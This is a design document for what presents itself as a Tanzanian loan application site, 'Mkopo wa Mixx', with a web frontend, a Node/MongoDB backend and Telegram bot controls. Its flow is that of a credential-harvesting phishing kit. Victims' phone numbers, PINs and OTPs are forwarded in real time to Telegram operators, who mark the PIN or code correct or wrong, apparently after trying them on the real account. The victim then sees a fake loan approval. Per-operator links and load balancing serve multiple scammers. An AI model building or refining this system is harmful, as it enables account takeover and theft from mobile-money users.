# Mkopo wa Mixx - Multi-Admin Loan Platform Architecture

## Overview

**Mkopo wa Mixx** is a sophisticated multi-admin loan application platform that integrates:
- **Frontend**: HTML/CSS/JavaScript single-page application
- **Backend**: Node.js/Express server with MongoDB database
- **Bot Integration**: Telegram bot for admin notifications and application management
- **Admin Management**: Hierarchical admin system with super admin controls

---

## Technology Stack

### Frontend
- **Language**: HTML5, CSS3, JavaScript (ES6+)
- **Framework**: Vanilla JS (no dependencies)
- **Styling**: Custom CSS with CSS variables
- **Storage**: sessionStorage (secure, tab-scoped)
- **UI/UX**: Responsive design, mobile-first approach

### Backend
- **Runtime**: Node.js (v18+)
- **Framework**: Express.js 4.18+
- **Database**: MongoDB 6.3+
- **ORM**: MongoDB Node.js Driver
- **Bot API**: node-telegram-bot-api 0.64+
- **Environment**: Dotenv for configuration

### Infrastructure
- **Hosting**: Render (with webhook support)
- **Communication**: Telegram Bot API (webhook mode, not polling)
- **Database Hosting**: MongoDB Atlas

---

## System Architecture

### High-Level Flow

```
User (Frontend) 
    ↓
[Application Form] → [PIN Verification] → [OTP Verification] → [Approval]
    ↓                      ↓                      ↓
[sessionStorage]   [sessionStorage]      [sessionStorage]
    ↓                      ↓                      ↓
/api/verify-pin    /api/verify-otp      /api/check-otp-status
    ↓                      ↓                      ↓
[MongoDB Save]     [MongoDB Update]     [Admin Approval]
    ↓                      ↓                      ↓
[Admin Telegram]   [Admin Telegram]     [Redirect to Approval]
    │                      │                      │
    ├─────────────────────┴──────────────────────┘
    ↓
Admin (Telegram)
    ├─ /approve (OTP)
    ├─ /reject (PIN)
    └─ View stats, manage applications
```

---

## Frontend Architecture

### Pages & Their Purpose

#### 1. **index.html** - Landing Page
- **Purpose**: Marketing and loan calculator
- **Features**:
  - Responsive navigation with smooth scroll
  - Interactive loan calculator (amount, term → monthly payment)
  - Features showcase
  - Security information
  - Customer reviews
  - Call-to-action buttons
- **Key Script**: `landing-script.js`
- **Admin Integration**: Reads `?admin=` URL parameter → stores in sessionStorage

#### 2. **application.html** - Application Form
- **Purpose**: Collect applicant information
- **Fields**:
  - Full Name, Email, Monthly Income
  - Loan Amount (TSh 500k - 50M), Purpose, Term, Employment Status
- **Key Script**: `application-script.js`
- **Validation**: Real-time field validation, error display
- **Data Flow**: 
  - Saves to sessionStorage
  - Redirects to verification.html

#### 3. **verification.html** - PIN Verification
- **Purpose**: Verify phone number and PIN
- **Fields**:
  - Phone Number (auto-formatted to +255 format)
  - PIN (4 digits, numbers only)
- **Key Script**: `verification-script.js`
- **Admin ID Handling**: 
  - Reads from sessionStorage ONLY (never localStorage)
  - Sends to `/api/verify-pin` endpoint
- **Status Polling**: Checks `/api/check-pin-status` every 2 seconds (150 checks max)
- **Outcome**:
  - ✅ Approved → redirect to otp.html
  - ❌ Rejected → show error, allow retry

#### 4. **otp.html** - OTP Verification
- **Purpose**: Verify one-time password from admin
- **Features**:
  - 4 OTP input boxes with auto-focus
  - 60-second countdown timer
  - Resend button (disabled until timer expires)
  - Inline error/success messages (no dialogs)
- **Key Script**: `otp-script.js`
- **Status Polling**: Checks `/api/check-otp-status` every 2 seconds
- **Possible Outcomes**:
  - ✅ approved → redirect to approval.html
  - ❌ wrongcode → retry OTP
  - ❌ wrongpin_otp → redirect to verification.html (re-enter PIN)
  - ❌ rejected → show error

#### 5. **approval.html** - Approval Screen
- **Purpose**: Display approved loan details and next steps
- **Features**:
  - Success animation with confetti
  - Loan amount, monthly payment, total repayment
  - Download loan agreement button
  - View dashboard button
  - Share on social media (WhatsApp, Facebook)
- **Key Script**: `approval-script.js`
- **Data Source**: sessionStorage (application data)
- **Calculations**: Uses stored loan amount/term to compute payments

#### 6. **admin-select.html** - Admin Selection (Mobile)
- **Purpose**: Allow users to select admin on landing page
- **Features**:
  - Admin card grid with name, email, status
  - Responsive layout
  - Stores selection in sessionStorage
  - Redirects to application form
- **API**: Calls `/api/admins` to fetch active admins

### sessionStorage Usage

**Critical Rule**: Admin ID MUST come from:
1. **First Priority**: URL parameter `?admin=ADMINID`
2. **Fallback**: Auto-assign by server (if no admin in URL)
3. **Never**: localStorage (causes cross-session leakage)

**sessionStorage Keys**:
```javascript
{
  "selectedAdminId": "ADMIN001",           // Admin handling the application
  "applicationData": {
    "applicationId": "LOAN-1234567890",     // Unique app ID
    "fullName": "John Doe",
    "email": "john@example.com",
    "monthlyIncome": "3000000",
    "loanAmount": "5000000",
    "loanPurpose": "personal",
    "loanTerm": "12",
    "employmentStatus": "employed",
    "phone": "+255712345678",               // Set at verification step
    "pin": "1234",                          // Set at verification step
    "adminId": "ADMIN001",                  // Copied from selectedAdminId
    "timestamp": "2026-06-26T..."
  }
}
```

---

## Backend Architecture

### Server Setup (server.js)

#### Initialization Flow
```
1. Load environment variables (.env)
2. Connect to MongoDB
3. Seed super admin (ADMIN001) if not exists
4. Load admin chat IDs from database
5. Set up Telegram webhook
6. Start Express server on PORT (default 10000)
```

#### Key Features
- **Webhook Mode**: Bot receives updates via POST, not polling
- **Keep-Alive**: Periodic health checks and admin map reloading
- **Graceful Shutdown**: Cleanup on SIGTERM/SIGINT

### Database Schema (database.js)

#### Collections

**admins**
```javascript
{
  _id: ObjectId,
  adminId: "ADMIN001",              // Unique, indexed
  name: "Super Admin",
  email: "superadmin@mixx.com",
  chatId: 123456789,                // Telegram chat ID
  status: "active" | "paused",
  botToken: "optional_token",
  createdAt: ISOString,
  updatedAt: ISOString
}
```

**applications**
```javascript
{
  _id: ObjectId,
  id: "APP-1234567890",             // Unique app ID
  adminId: "ADMIN001",              // Assigned admin
  adminName: "Admin Name",
  phoneNumber: "+255712345678",
  pin: "1234",
  pinStatus: "pending" | "approved" | "rejected",
  otp: "1234",
  otpStatus: "pending" | "approved" | "wrongcode" | "wrongpin_otp" | "rejected",
  assignmentType: "auto" | "manual",
  isReturningUser: boolean,
  previousCount: number,
  timestamp: ISOString,
  updatedAt: ISOString
}
```

### API Endpoints

#### User Endpoints

**POST /api/verify-pin**
- Receives: `{ phoneNumber, pin, adminId (optional) }`
- Logic:
  1. Check for duplicate pending apps (same phone, same admin)
  2. If specific admin: validate and use
  3. If no admin: auto-assign to least-loaded active admin
  4. Save to database
  5. Send Telegram notification to admin with approve/reject buttons
- Returns: `{ success, applicationId, assignedTo, assignedAdminId }`

**GET /api/check-pin-status/:applicationId**
- Returns: `{ success, status }`
- Frontend polls this every 2 seconds

**POST /api/verify-otp**
- Receives: `{ applicationId, otp }`
- Logic:
  1. Find application
  2. Save OTP to database
  3. Send Telegram notification to admin with verification buttons
- Returns: `{ success }`

**GET /api/check-otp-status/:applicationId**
- Returns: `{ success, status }`
- Frontend polls this every 2 seconds

**POST /api/resend-otp**
- Receives: `{ applicationId }`
- Logic: Notify admin that user requested OTP resend

**GET /api/admins**
- Returns list of active, non-paused admins
- Used by admin-select.html

**GET /api/validate-admin/:adminId**
- Validates if admin is active and connected

#### Admin Endpoints (Telegram Bot)

**Commands**:
```
/start                          - Register/welcome admin
/mylink                         - Get personal link
/stats                          - View statistics
/pending                        - List pending applications
/myinfo                         - Admin info
/addadmin NAME|EMAIL|CHATID     - Add new admin (superadmin only)
/addadminid ADMINID|NAME|EMAIL|CHATID - Add with custom ID
/transferadmin oldChatId | newChatId  - Transfer access
/pauseadmin ADMINID             - Pause admin access
/unpauseadmin ADMINID           - Restore admin access
/removeadmin ADMINID            - Delete admin
/admins                         - List all admins
/send ADMINID message           - Send message to admin (superadmin)
/broadcast message              - Send to all admins (superadmin)
/ask ADMINID request            - Request action from admin (with buttons)
```

**Callback Queries**:
```
allow_pin_ADMINID_APPID         - Approve PIN
deny_pin_ADMINID_APPID          - Reject PIN
approve_otp_ADMINID_APPID       - Approve loan
wrongcode_otp_ADMINID_APPID     - Wrong OTP code
wrongpin_otp_ADMINID_APPID      - Wrong PIN at OTP stage
request_done_REQID_ADMINID      - Admin completed request
request_help_REQID_ADMINID      - Admin needs help
```

### Critical Bug Fixes Implemented

#### 1. **Race Condition Fix** (Duplicate Prevention)
```javascript
// Problem: Same user submitting PIN twice simultaneously → duplicate apps
// Solution: Lock map prevents concurrent requests for same phone
const processingLocks = new Set();
const lockKey = `pin_${phoneNumber}`;
if (processingLocks.has(lockKey)) return 429 error;
processingLocks.add(lockKey);
// ... process ...
processingLocks.delete(lockKey);
```

#### 2. **Map Mutation After Restart**
```javascript
// Problem: Render restart → adminChatIds map empty → "0 admins connected"
// Solution: Reload admin map from DB before use
await loadAdminChatIds();
// Periodic reload every 60 seconds
setInterval(async () => {
  await loadAdminChatIds();
}, 60000);
```

#### 3. **Stale Admin ID Leakage**
```javascript
// Problem: localStorage persists across sessions → wrong admin assignment
// Solution: ONLY use sessionStorage (dies when tab closes)
// Rule enforced in all frontend scripts:
const adminId = sessionStorage.getItem('selectedAdminId'); // ✅ CORRECT
// NOT: localStorage.getItem('selectedAdminId'); // ❌ WRONG
```

#### 4. **Ownership Enforcement**
```javascript
// Problem: Admin A clicks button meant for Admin B's app
// Solution: Embed admin ID in callback_data, verify on click
// Format: action_type_ADMINID_applicationId
if (embeddedAdminId !== currentAdminId) {
  return error("This app belongs to another admin!");
}
```

#### 5. **Bot Connectivity Loss**
```javascript
// Problem: After Render restart, bot doesn't receive messages
// Solution: Webhook health check with auto-fix
setInterval(async () => {
  const info = await bot.getWebHookInfo();
  if (info.url !== expectedUrl) {
    await bot.setWebHook(expectedUrl); // Auto-repair
  }
}, 60000);
```

---

## Admin System

### Admin Hierarchy

```
ADMIN001 (Super Admin)
  ├─ Full system access
  ├─ Can manage other admins
  ├─ Can pause/unpause admins
  ├─ Can broadcast messages
  └─ Cannot be paused/removed
  
ADMIN002, ADMIN003, ... (Regular Admins)
  ├─ Receive applications
  ├─ Approve/reject PIN
  ├─ Approve/reject OTP
  ├─ View stats
  └─ Can be paused (but stay in DB)
```

### Admin Status

- **active**: Can approve/reject applications
- **paused**: Cannot access bot commands or approve apps
- **connected**: Admin has sent `/start` and is in adminChatIds map
- **not connected**: Admin exists in DB but hasn't started bot yet

---

## Data Flow Diagrams

### Complete Application Flow

```
┌─────────────────────────────────────────────────────────────────┐
│ USER STARTS APPLICATION                                         │
│ URL: https://site.com/?admin=ADMIN002                           │
└─────────────────────────────────────────────────────────────────┘
        ↓
┌─────────────────────────────────────────────────────────────────┐
│ LANDING PAGE (index.html)                                       │
│ - Sets sessionStorage.selectedAdminId = "ADMIN002"              │
│ - User clicks "Apply Now"                                       │
└─────────────────────────────────────────────────────────────────┘
        ↓
┌─────────────────────────────────────────────────────────────────┐
│ APPLICATION FORM (application.html)                             │
│ - User fills: name, email, income, loan amount, etc.            │
│ - Validates in real-time                                        │
│ - Stores in sessionStorage.applicationData                      │
│ - User clicks "Next"                                            │
└─────────────────────────────────────────────────────────────────┘
        ↓
┌─────────────────────────────────────────────────────────────────┐
│ PIN VERIFICATION (verification.html)                            │
│ - User enters phone + PIN                                       │
│ - POST /api/verify-pin                                          │
│   ├─ Check for duplicates                                       │
│   ├─ Assign admin (specific or auto-load-balanced)              │
│   ├─ Save to MongoDB                                            │
│   └─ Send Telegram notification to admin                        │
│ - Frontend polls /api/check-pin-status every 2s                 │
│ - ADMIN receives Telegram message with 2 buttons:               │
│   ├─ "✅ Correct - Allow OTP" → callback updates DB to approved │
│   └─ "❌ Invalid - Deny" → callback updates DB to rejected      │
└─────────────────────────────────────────────────────────────────┘
        ↓
┌─────────────────────────────────────────────────────────────────┐
│ OTP VERIFICATION (otp.html)                                     │
│ - User enters 4-digit OTP                                       │
│ - POST /api/verify-otp                                          │
│   ├─ Save OTP to MongoDB                                        │
│   └─ Send Telegram notification to admin                        │
│ - Admin receives Telegram message with 3 buttons:               │
│   ├─ "❌ Wrong PIN" → sets otpStatus to wrongpin_otp            │
│   ├─ "❌ Wrong Code" → sets otpStatus to wrongcode              │
│   └─ "✅ Approve Loan" → sets otpStatus to approved             │
│ - Frontend polls /api/check-otp-status every 2s                 │
├─ If approved → redirect to approval.html                        │
├─ If wrongcode → show error, user retries OTP                    │
└─ If wrongpin_otp → redirect to verification.html (re-enter PIN) │
        ↓
┌─────────────────────────────────────────────────────────────────┐
│ APPROVAL PAGE (approval.html)                                   │
│ - Show success animation + confetti                             │
│ - Display loan details:                                         │
│   ├─ Approved Amount: TSh 5,000,000                             │
│   ├─ Monthly Payment: TSh 458,000                               │
│   ├─ Total Repayment: TSh 5,496,000                             │
│   └─ Interest Rate: 12% APR                                     │
│ - Options:                                                      │
│   ├─ Download Agreement                                         │
│   ├─ View Dashboard                                             │
│   └─ Share on Social Media                                      │
└─────────────────────────────────────────────────────────────────┘
```

### Admin Notification Flow

```
┌──────────────────────────┐
│ Application submitted    │
│ /api/verify-pin          │
└────────┬─────────────────┘
         │
         ↓
┌──────────────────────────────────────────────────┐
│ Telegram Message (PIN verification)              │
│ ┌──────────────────────────────────────────────┐ │
│ │ 📱 NEW APPLICATION                           │ │
│ │ 📋 APP-1234567890                            │ │
│ │ 📱 +255712345678                             │ │
│ │ 🔑 1234                                       │ │
│ │ ⏰ 26/06/2026 10:30                           │ │
│ │ 📊 Returned: 2 prev applications (Last: ✅)   │ │
│ │                                              │ │
│ │ [❌ Invalid] [✅ Correct - Allow OTP]        │ │
│ └──────────────────────────────────────────────┘ │
└────────┬─────────────────────────────────────────┘
         │
         ├─→ Admin clicks "✅ Correct"
         │   └─→ otpStatus = "pending" (wait for OTP)
         │
         └─→ Admin clicks "❌ Invalid"
             └─→ otpStatus = "rejected" (app rejected)
```

---

## Environment Variables (.env)

```bash
# MongoDB
MONGODB_URI=mongodb+srv://user:pass@cluster.mongodb.net/?retryWrites=true&w=majority

# Telegram Bot
SUPER_ADMIN_BOT_TOKEN=123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
SUPER_ADMIN_CHAT_ID=123456789

# Server
PORT=10000
NODE_ENV=production
RENDER_EXTERNAL_URL=https://final-8xfd.onrender.com
APP_URL=https://final-8xfd.onrender.com
```

---

## File Structure

```
.
├── index.html                 # Landing page
├── application.html           # Loan application form
├── verification.html          # PIN verification
├── otp.html                   # OTP verification
├── approval.html              # Approval screen
├── admin-select.html          # Admin selection
│
├── landing-script.js          # Landing page logic
├── application-script.js      # Application form logic
├── verification-script.js     # PIN verification logic
├── otp-script.js              # OTP verification logic
├── approval-script.js         # Approval screen logic
│
├── style.css                  # Global styles
│
├── server.js                  # Express server + Telegram bot
├── database.js                # MongoDB operations
├── package.json               # Dependencies
│
└── .env                       # Environment variables (not in repo)
```

---

## Security Considerations

### Data Protection

1. **sessionStorage**: Scoped to browser tab, cleared on close
2. **No localStorage**: Prevents cross-session data leakage
3. **HTTPS Only**: All communication encrypted (Render enforces)
4. **Database**: MongoDB with IP whitelist + user authentication
5. **Telegram**: Bot token stored in env variables, never exposed

### Admin Verification

1. **Callback Query Ownership**: Embedded admin ID verified on every action
2. **Chat ID Validation**: Admin must send `/start` before accessing bot
3. **Status Checks**: Paused admins cannot perform any actions
4. **URL Parameter Validation**: Admin ID must exist and be active

### Application Data

1. **PIN Storage**: Stored in DB (encrypted with MongoDB encryption at rest)
2. **Phone Masking**: UI shows `****7678` format
3. **Applicant Privacy**: Data only shared with assigned admin
4. **Audit Trail**: All actions timestamped

---

## Deployment

### Render Setup

1. **Create Web Service** from GitHub repo
2. **Environment Variables**: Set MONGODB_URI, BOT_TOKEN, etc.
3. **Build Command**: `npm install`
4. **Start Command**: `npm start`
5. **Webhook URL**: Automatically `https://final-8xfd.onrender.com/telegram-webhook`

### MongoDB Atlas Setup

1. Create cluster
2. Create user with password
3. Whitelist Render IP (or 0.0.0.0/0 for dev)
4. Get connection string: `mongodb+srv://user:pass@cluster.mongodb.net/?retryWrites=true&w=majority`

---

## Testing Checklist

- [ ] User can apply without admin link (auto-assign)
- [ ] User can apply with admin link (specific admin)
- [ ] Admin receives PIN notification
- [ ] Admin can approve/reject PIN
- [ ] User sees correct status after admin action
- [ ] Admin receives OTP notification
- [ ] Admin can approve loan
- [ ] User sees approval page
- [ ] Returning user shows history
- [ ] Super admin can add new admin
- [ ] Super admin can pause/unpause admin
- [ ] Paused admin cannot access bot
- [ ] Bot survives server restart

---

## Performance Optimizations

- **Frontend**: 
  - Lazy loading for images
  - CSS animations use GPU (transform, opacity)
  - No blocking JS on landing page

- **Backend**:
  - MongoDB indexes on frequently queried fields
  - Connection pooling with MongoClient
  - Webhook mode (no polling overhead)

- **Database**:
  - Indexed queries: adminId, phoneNumber, timestamp
  - Sorted queries use index

---

## Future Enhancements

1. **Dashboard**: Real-time admin dashboard with charts
2. **SMS Notifications**: Send loan status to applicant
3. **Email Confirmations**: Application receipt, approval letter
4. **Multi-language**: Switch between Swahili/English
5. **Two-Factor Authentication**: SMS OTP instead of PIN
6. **Loan Repayment Tracking**: Payment schedule, reminders
7. **Admin Reports**: Monthly/yearly statistics export
8. **Fraud Detection**: Machine learning for suspicious applications

---

## Troubleshooting

### Problem: "0 admins connected" after server restart
**Solution**: Admin map is reloaded from DB every 60 seconds. Wait or restart app.

### Problem: Admin doesn't receive notifications
**Causes**:
- Bot token incorrect
- Admin hasn't sent `/start` (not in chat ID map)
- Admin is paused
- Webhook not set

**Fix**: 
1. Verify bot token in .env
2. Ask admin to send `/start`
3. Check admin status: `/admins`
4. Check webhook: GET `/health`

### Problem: Application stuck in "pending" status
**Cause**: Admin not responding, network issue
**Solution**: 
- Admin manually updates via Telegram button
- Or resend verification, get different admin

### Problem: User sees wrong admin's applications
**Cause**: sessionStorage contaminated
**Solution**: 
- Close browser tab (sessionStorage cleared)
- Or clear site data in browser

---

## Support

For issues or questions:
1. Check server logs: `npm start`
2. Check MongoDB logs
3. Verify environment variables
4. Test Telegram bot: `/start`
5. Check webhook status: `/health`

